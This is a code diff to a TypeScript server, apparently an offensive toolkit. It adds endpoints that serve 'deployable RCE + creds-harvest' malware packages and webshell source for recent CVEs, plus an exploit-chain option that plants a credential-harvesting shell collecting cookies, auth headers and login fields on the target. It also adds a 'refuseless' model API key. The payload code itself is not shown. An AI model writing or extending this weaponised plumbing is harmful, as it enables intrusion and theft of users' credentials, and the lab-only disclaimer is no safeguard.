@@ -47,6 +47,7 @@ import { handleCorrelationApi } from './threat-intel/correlation.js';
 import { resolveMissionLaunchConfig, resolveMissionStatus } from './mission/http-lifecycle.js';
 import { getPayloadsForCve, CVE_PAYLOAD_CATALOG } from './tools/cve-payloads.js';
 import { runWoltlabChain, breakoutPayload } from './tools/cve-woltlab-rce.js';
+import { getMalwarePackages, getMalwarePackageForCve, t3kWebshellSource, fullShellSource } from './tools/cve-malware.js';
 import { solveFormatString, solveRsaWeak } from './tools/ctf-classics.js';
 import { fireOomExhaust, runUafAttempt, php85ConsumerWindow } from './tools/php-src-oct26.js';
 import { INFRA_TOOLS, classifyTarget, domainInfraScan, ipInfraScan, circlHash } from './tools/osint-infra.js';
@@ -7561,6 +7562,7 @@ const ENV_APIKEY_MAP: Record<string, string> = {
   huggingface: 'HF_TOKEN',
   nanogpt: 'NANOGPT_API_KEY',
   novita: 'NOVITA_API_KEY',
+  refuseless: 'REFUSELESS_API_KEY',
   litellm: 'LITELLM_API_KEY',
   groq: 'GROQ_API_KEY',
   together: 'TOGETHER_API_KEY',
@@ -9789,6 +9791,35 @@ app.get('/api/cves/payloads', (req: Request, res: Response): void => {
   });
 });
 
+// MUST be registered before /api/cves/:cveId or "malware" is eaten as :cveId.
+// MALWARE PACKAGES — deployable RCE + creds-harvest packages for the recently
+// ingested CVEs (php-src Oct-2026 pair + WoltLab pair). Package definitions
+// live in src/tools/cve-malware.ts; this serves them and the compiled shell.
+app.get('/api/cves/malware', (req: Request, res: Response): void => {
+  const single = typeof req.query.cveId === 'string' ? req.query.cveId.trim() : '';
+  if (single) {
+    const pkg = getMalwarePackageForCve(single);
+    if (!pkg) {
+      res.status(404).json({ success: false, error: `No malware package for ${single}`, packages: getMalwarePackages().map(p => p.id) });
+      return;
+    }
+    res.json({ success: true, package: pkg, webshell: t3kWebshellSource() });
+    return;
+  }
+  res.json({
+    success: true,
+    count: getMalwarePackages().length,
+    objective: 'RCE → full control → user credentials',
+    authorizedUse: 'Lab and receipted targets only. The creds harvester is passive (auth headers, cookies, login POST fields, session contents) — it writes <TMP>/.t3k-creds.jsonl on the target.',
+    packages: getMalwarePackages(),
+  });
+});
+
+app.get('/api/cves/malware/webshell', (_req: Request, res: Response): void => {
+  const shell = t3kWebshellSource();
+  res.json({ success: true, bytes: shell.length, webshell: shell });
+});
+
 // =============================================================================
 // ACTIVE EXPLOIT CHAIN — CVE-2026-79362 WoltLab DiskCacheSource poison → RCE.
 // The engine owns the authorization gate (rce mode vs public host requires the
@@ -9829,6 +9860,9 @@ app.post('/api/exploit/woltlab-chain', async (req: Request, res: Response): Prom
       injectPath: typeof b.injectPath === 'string' && b.injectPath.trim() ? b.injectPath.trim() : undefined,
       injectField: typeof b.injectField === 'string' && b.injectField.trim() ? b.injectField.trim() : undefined,
       timeoutMs: typeof b.timeoutMs === 'number' ? b.timeoutMs : undefined,
+      // The malware package's shell carries the creds harvester; without it the chain
+      // injects the bare command shell and captures nothing. `malware:true` opts in.
+      shellOverride: b.malware === true ? fullShellSource() : undefined,
     });
     console.log(`[T3MP3ST][EXPLOIT] woltlab-chain ${mode} ${target} → poisoned=${result.poisoned} rce=${result.rce} (${result.stages.length} stages)`);
     res.json({ success: !result.error, ...result });
